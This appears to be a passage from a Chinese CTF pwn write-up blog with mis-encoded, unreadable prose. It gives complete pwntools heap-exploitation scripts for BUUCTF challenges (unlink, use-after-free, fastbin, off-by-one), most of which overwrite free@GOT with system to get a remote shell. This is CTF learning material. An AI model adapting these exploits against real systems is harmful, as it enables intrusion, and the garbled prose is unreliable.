<li>æ³„éœ²åœ°å€æ–¹é¢ï¼šä¸ä»…å¯ä»¥ç”¨putsï¼Œè¿˜å¯ä»¥ç”¨writeï¼›è®²é“ç†ä¸€åˆ‡èƒ½è¾“å‡ºåˆ°ç»ˆç«¯çš„å‡½æ•°éƒ½å¯ä»¥åˆ©ç”¨æ¥æ³„éœ²å†…å®¹ï¼Œåç»­æ…¢æ…¢æ¢ç´¢</li>
<li>æ³„éœ²åœ°å€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ogè¿›è¡Œææƒ</li>
</ol></li>
<li>ä¸€äº›å·¥å…·çš„ä½¿ç”¨
<ol type="1">
<li>flatå¯ä»¥ç”¨æ¥æ„é€ payload</li>
</ol></li>
</ol>
<h2 id="x03-ä¸€äº›é—®é¢˜">0x03 ä¸€äº›é—®é¢˜</h2>
<ol type="1">
<li>0x01
ä¸­ç¬¬ä¸ƒæ­¥payloadï¼Œä¸ºä»€ä¹ˆåœ¨sendæ—¶åªèƒ½æ˜¯sendlineï¼Œæˆ‘çœ‹receivedçš„ç»“æœæ˜æ˜éƒ½ä¸€æ ·å•Š</li>
<li>0x01
ä¸­ç¬¬ä¹æ­¥payloadï¼Œputsä¸ºä»€ä¹ˆä¸ä¼šæ‰“å°åé¢çš„å†…å®¹äº†ï¼ˆä»£ç åº•éƒ¨'æ³¨2'ï¼‰ï¼Ÿä¸ºä»€ä¹ˆputs_gotåé¢ä¸€å®šæ˜¯å¯ä»¥è¢«è½¬æ¢ä¸º0açš„00ï¼Ÿ</li>
<li>0x01 ä¸­ç¬¬12æ­¥payloadï¼Œä¸ºä»€ä¹ˆéœ€è¦sys_addr + 0 +
bin_shï¼Œè¿™ä¸ª0æ˜¯sys_addrçš„è¿”å›åœ°å€å—ï¼Ÿ</li>
<li>ç½‘ä¸Šå¾ˆå¤šåšå®¢éƒ½ç”¨LibcSearcherï¼Œå¯æ˜¯æˆ‘åœ¨å°†LibcSearcheræ•°æ®åº“æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ä»¥åè¿˜æ˜¯æ— æ³•æŸ¥åˆ°å¯¹åº”libcåº“ï¼Œå¾ˆå¥‡æ€ª</li>
</ol>
<h1 id="x03-buuctf-hitcontraining_bamboobox">0x03 buuctf
hitcontraining_bamboobox</h1>
<h2 id="poc">POC</h2>
<p>è¿™é¢˜çœ‹åæ±‡ç¼–ä»£ç æœ‰ä¸ª magicï¼Œåº”è¯¥ç”¨ House of Forceï¼Œä½†æ˜¯ buu å–œæ¬¢æŠŠ
flag æ”¾åœ¨ / ç›®å½•ä¸‹ï¼Œæ‰€ä»¥é¢˜ç›®æä¾›çš„ magic å‡½æ•°å°±å¤±æ•ˆäº†</p>
<p>æ‰€ä»¥ç”¨ unlink ä¿®æ”¹å †è¡¨ï¼Œä½¿æˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„åœ°å€å†™</p>
<h2 id="exp">exp</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./bamboobox&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def show():</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def alloc(size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of item:&#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line">  io.sendlineafter(&#x27;length of item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of the item:&#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x40,&#x27;a&#x27;*8 )         # 0</span><br><span class="line">alloc(0x80,&#x27;b&#x27; * 8)        # 1</span><br><span class="line">alloc(0x80,&#x27;c&#x27; * 8)        # 2</span><br><span class="line">alloc(0x20,&#x27;/bin/sh\x00\x00\x00\x00&#x27;)  # 3</span><br><span class="line"></span><br><span class="line">ptr=0x6020c8</span><br><span class="line">fd=ptr-0x18</span><br><span class="line">bk=ptr-0x10</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(0)</span><br><span class="line">fake_chunk+=p64(0x41)</span><br><span class="line">fake_chunk+=p64(fd)</span><br><span class="line">fake_chunk+=p64(bk)</span><br><span class="line">fake_chunk+=b&#x27;\x00&#x27;*0x20</span><br><span class="line">fake_chunk+=p64(0x40)</span><br><span class="line">fake_chunk+=p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)</span><br><span class="line"></span><br><span class="line">edit(0,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">free_addr=u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b&#x27;\x00&#x27;)) </span><br><span class="line">libc=LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr   ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">edit(0,0x8,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x04-hitcontraining_uaf">0x04 hitcontraining_uaf</h1>
<p>â… . æ‰€ç”¨çŸ¥è¯†ç‚¹ï¼š<br />
1. é€†å‘åˆ†æï¼ˆè¿™ä¸ªé¢˜é€†å‘å¤ªåç‰¢äº†ï¼Œpseudocodeå¤ªæ¶å¿ƒï¼Œåªèƒ½ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼‰ 2.
åˆ©ç”¨fastbinæ€§è´¨å®ç° 3. UAF</p>
<p>â…¡. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25676</span><br><span class="line">file = &#x27;./hacknote&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./hacknote&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;,content)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def print(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">get_shell = 0x8048945</span><br><span class="line">alloc(0x8,p32(get_shell))</span><br><span class="line">print(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>â…¢. è§£é¢˜æ„Ÿè¨€
è¿™ä¸ªé¢˜è¯¥è¯´æ˜¯å‡ºçš„å¾ˆçµæ´»è¿˜æ˜¯å¾ˆé€†å¤©...æƒ³è¦å‘ç°åˆ©ç”¨ç‚¹éœ€è¦æ¯”è¾ƒæ‰å®çš„é€†å‘åŠŸåº•æ‰è¡Œã€‚å…¶æ¬¡è¿˜è¦å¯¹fastbinå¯¹äºä¸åŒå¤§å°çš„chunkçš„åˆ†é…é—®é¢˜æœ‰æ¯”è¾ƒæ·±å…¥çš„äº†è§£ã€‚</p>
<h1 id="x05-hitcontraining_magicheap">0x05 hitcontraining_magicheap</h1>
<p>â… . æ‰€ç”¨çŸ¥è¯†ç‚¹<br />
1. åˆ©ç”¨fastbinçš„FFSLè¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>â…¡. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29259</span><br><span class="line">file = &#x27;./magicheap&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./magicheap&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap : &#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">fake_chunk = 0x60208d</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x60,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x40,&#x27;\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3 + p64(0x71) + p64(fake_chunk)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(0x60,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x60,&#x27;aaaaaaaa&#x27;)</span><br><span class="line">io.sendline(str(4869))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure></p>
<p>â…¢. è§£é¢˜æ„Ÿè¨€<br />
å››é“å †é¢˜äº†ï¼Œè¿™æ˜¯ç¬¬ä¸€é“è‡ªå·±åšå‡ºæ¥çš„å †é¢˜<br />
æˆ‘åšPwnçš„æ•´ä½“ä¹ æƒ¯æ˜¯è¾¹æ‰“è¾¹å­¦ï¼Œæ²¡æœ‰è¯´æ˜¯å…ˆå­¦å†æ‰“<br />
è¿™é“é¢˜æ•´ä½“æ„Ÿè§‰è·Ÿ[ZJCTF
2019]EasyHeapéå¸¸åƒï¼Œä¸è¿‡133tå‡½æ•°é‡Œè—çš„æ˜¯çœŸflagï¼Œä¸ç”¨å»æ³„éœ²libcåœ°å€åŠ«æŒmalloc_hookäº†<br />
å› ä¸ºç‰¹åˆ«åƒæ‰€ä»¥å°±è€ƒè™‘ç”¨fastbin
attackæ‰“ï¼Œäº‹å®ä¸Šæˆ‘åˆ°ç°åœ¨ä¹Ÿä¸å¤ªæ¸…æ¥šè¿™ç®—ä¸ç®—fastbin attack<br />
åªæ˜¯åˆ©ç”¨äº†å †æº¢å‡ºå’Œä»fastbiné‡Œç”³è¯·chunkçš„ç‰¹æ€§è¿›è¡Œäº†ä¸€ä¸ªä»»æ„åœ°å€çš„å†™<br />
è§£å†³äº†babyheapé‚£é“é¢˜é‡Œä¸æ¸…æ¥šçš„ä¸€ä¸ªç‚¹(ä¸ºä»€ä¹ˆåœ¨0x..aedç”³è¯·fake_chunk)<br />
è¿™é“é¢˜ç½‘ä¸Šè¿˜æœ‰unsortedbin attackï¼ŒæŠ½ç©ºå­¦ä¸€ä¸‹</p>
<h1 id="x06-ciscn_2019_n_3">0x06 ciscn_2019_n_3</h1>
<p>â… . æ‰€ç”¨çŸ¥è¯†ç‚¹<br />
1. UAF</p>
<p>â…¡. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26279</span><br><span class="line">file = &#x27;./ciscn_2019_n_3&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_n_3&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def alloc(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Length &gt; &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(1,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">sys_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = b&#x27;bash&#x27;+p32(sys_plt)</span><br><span class="line">alloc(2,0xc,payload)</span><br><span class="line">delete(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>â…¢.è§£é¢˜æ„Ÿè¨€<br />
ç¬¬äºŒé“è‡ªå·±åšçš„heapï¼Œæ€»ä½“æ„Ÿè§‰å‰ä¸¤é¡µçš„heapéƒ½å±äºç­¾åˆ°</p>
<h1 id="x07-babyfengshui_33c3_2016">0x07 babyfengshui_33c3_2016</h1>
<p>â… . æ‰€ç”¨çŸ¥è¯† 1. é€†å‘åˆ†æï¼šå¥‡è‘©çš„å †æº¢å‡ºæ£€æµ‹æ–¹å¼</p>
<p>â…¡.å®Œæ•´EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 28267</span><br><span class="line">file = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./babyfengshui_33c3_2016&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">def alloc(hsize,name,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(0))</span><br><span class="line">  io.sendlineafter(&#x27;description: &#x27;, str(hsize))</span><br><span class="line">  io.sendlineafter(&#x27;name: &#x27; , name)</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def edit(index,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x8,&#x27;aaaa&#x27;,0x8,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">alloc(0x100,&#x27;a&#x27;,0x80,&#x27;a&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x108 + b&#x27;a&#x27;*8 + b&#x27;a&#x27;*0x80 + b&#x27;a&#x27;*8 + p32(free_got)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">edit(3,0x200,payload)</span><br><span class="line">dump(1)</span><br><span class="line">io.recvuntil(&#x27;description: &#x27;)</span><br><span class="line">free_addr = u32(io.recv(4))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(1,0x80,p32(sys_addr))</span><br><span class="line">delete(2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>â…¢. summary 1.
å¥½éš¾...é€†å‘ä»¥åæœ¬æ¥å°±ä¸€å¤§å †æŒ‡é’ˆå’Œå‡½æ•°è°ƒç”¨ï¼Œå…³ç³»ç†éƒ½ç†ä¸æ¸…è¿˜è¦åˆ©ç”¨ï¼Œè¿™é“é¢˜çš„expåˆ©ç”¨äº†â€œå‡½æ•°å †ä¸­åˆ©ç”¨æŒ‡é’ˆå»è¯»å†™â€œçš„é€»è¾‘å»è¦†å†™free_gotçš„åœ°å€
2. ä¸€äº›é—®é¢˜ 1.
ä¸ºä»€ä¹ˆLibcSearcheråœ¨æœ¬åœ°å°±èƒ½æŸ¥åˆ°æ­£ç¡®çš„åŸºå€æˆåŠŸææƒï¼Œåˆ°è¿œç¨‹å°±ä¸è¡Œäº†ï¼Ÿ 1.
åœ¨æœ¬åœ°freegotæŒ‡å‘äº†540ï¼Œè€Œè¿œç«¯æ˜¯750ï¼Œæœ¬åœ°libcç‰ˆæœ¬å·èƒ½æŸ¥å¯¹ï¼Œè¯´æ˜è¿œç«¯æœ‰ä»€ä¹ˆé—®é¢˜
2. é‚£ä¹ˆè¿™ä¸ªé—®é¢˜æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<h1 id="x08-hitcontraining_heapcreator">0x08
hitcontraining_heapcreator</h1>
<p>â… . è§£é¢˜çŸ¥è¯†ç‚¹ 1. off-by-one</p>
<p>â…¡. å®Œæ•´EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25756</span><br><span class="line">file = &#x27;./heapcreator&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./heapcreator&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;, content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;heap :&#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x18,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + p64(0)*2 + p64(0x81)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0)*8 + p64(0x8) + p64(free_got)</span><br><span class="line">alloc(0x70,payload)</span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;Content : &#x27;)</span><br><span class="line">free_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>â…¢. summary AKç¬¬äºŒé¡µ<sub>å®Œç»“æ’’flag</sub>
è¿™é“é¢˜åŸºæœ¬å°±åªæŠŠä¸Šä¸€é“é¢˜å †æº¢å‡ºæ£€æµ‹æ”¹ä¸ºoff-by-oneï¼Œå…¶ä»–åŸºæœ¬æ²¡å•¥å˜åŠ¨ï¼Œå¯ä»¥ç®—æ˜¯ç¬¬ä¸‰é“è‡ªå·±è§£å‡ºæ¥çš„heapé¢˜~</p>
<h1 id="x09-hitcon2014_stkof">0x09 hitcon2014_stkof</h1>
<p>â… .çŸ¥è¯†ç‚¹ 1. unlink 2. ä¸å…³é—­I/Oç¼“å†²åŒºçš„åæœ</p>
<p>â…¡. å®Œæ•´EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26280</span><br><span class="line">file = &#x27;./stkof&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./stkof&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/64libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line">    </span><br><span class="line">def fill(idx, content):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x80)</span><br><span class="line">alloc(0x30)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">target = 0x602140 + 0x10</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0) + p64(0x30)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += b&quot;a&quot;*0x10</span><br><span class="line"></span><br><span class="line">payload += p64(0x30) + p64(0x90)</span><br><span class="line">fill(2,payload)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x10</span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(2,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(1,payload)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:]+b&#x27;\x00\x00&#x27;)</span><br><span class="line"># log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(1,payload)</span><br><span class="line"></span><br><span class="line">fill(4,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="x0a-jarvisoj_level5">0x0A jarvisoj_level5</h1>
<p>å›½èµ›å‰å¤ä¹ ä¸€ä¸‹æ ˆé¢˜æ˜¯æ€ä¹ˆæ‰“çš„</p>
